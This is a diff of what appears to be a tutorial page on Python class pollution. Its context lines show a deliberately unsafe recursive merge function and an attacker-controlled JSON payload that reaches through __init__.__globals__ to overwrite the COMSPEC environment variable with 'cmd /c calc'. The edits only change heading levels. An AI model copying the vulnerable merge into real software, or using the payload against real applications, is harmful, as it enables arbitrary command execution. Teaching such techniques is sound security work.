@@ -89,7 +89,7 @@ class SystemAdmin(Employee): # Class inherits from Employee class def execute\_c
 
 def merge(src, dst):
 
-## Recursive merge function
+### Recursive merge function
 
 for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
@@ -99,7 +99,7 @@ recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()
 
 print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"
 
-## Create default value for Employee.custom\_command
+### Create default value for Employee.custom\_command
 
 merge(USER\_INPUT, recruiter\_emp)
 
@@ -151,11 +151,11 @@ class Employee: def **init**(self): pass
 
 def merge(src, dst):
 
-## Recursive merge function
+### Recursive merge function
 
 for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
-## Overwrite env var "COMSPEC" to execute a calc
+### Overwrite env var "COMSPEC" to execute a calc
 
 USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value
 
